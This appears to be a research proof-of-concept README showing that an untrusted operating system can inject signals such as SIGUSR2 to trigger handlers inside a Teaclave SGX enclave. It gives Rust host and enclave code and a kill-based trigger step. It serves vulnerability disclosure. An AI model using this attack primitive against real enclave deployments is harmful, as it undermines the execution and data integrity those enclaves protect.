# teaclave
We demonstrate an attack on teaclave that enables an untrusted operating system to arbitrarily inject signals triggering enclave signal handlers. This can be used to compromise the execution and data integrity of the enclave. 

Build and run the program below in Teaclave. 

```jsx
// untrusted code:
fn main() {
    let enclave = match init_enclave() {
        Ok(r) => {
            println!("[+] Init Enclave Successful {}!", r.geteid());
            r
        },
        Err(x) => {
            println!("[-] Init Enclave Failed {}!", x.as_str());
            return;
        },
    };
    let handle = thread::spawn(move || {
        let mut retval = 0usize;
        let result = unsafe {
            attack__init_enclave(enclave.geteid(),
                                 &mut retval);
        };
        println!("[+] init returned value (1337)");
        // enclave.destroy();
    });
    println!("now we do nothing in untrusted app code ...");
    while true {
    }
}

// enclave:
fn test() {
    println!("sig handler was called");
}

#[no_mangle]
pub extern "C" fn attack__init_enclave() -> size_t {
    println!("hello from enclave");

    println!("registering signal handler...");
    register(SIGUSR2, test).unwrap();
    println!("busy waiting in enclave");
    let s = time::Duration::new(5, 0);
    println!("returning...");
    
    while true {    
   }
    
    return 1337;
}
```
Then, inject SIGUSR2 to the enclave process using the `kill` utility from outside the enclave. This triggers the handler in the enclave and prints `sig handler as called`.

As a simplification in our PoC, we busy wait in the enclave to wait for the signal injection. However, this is simply for convenience and can be eliminated for an end-to-end attack.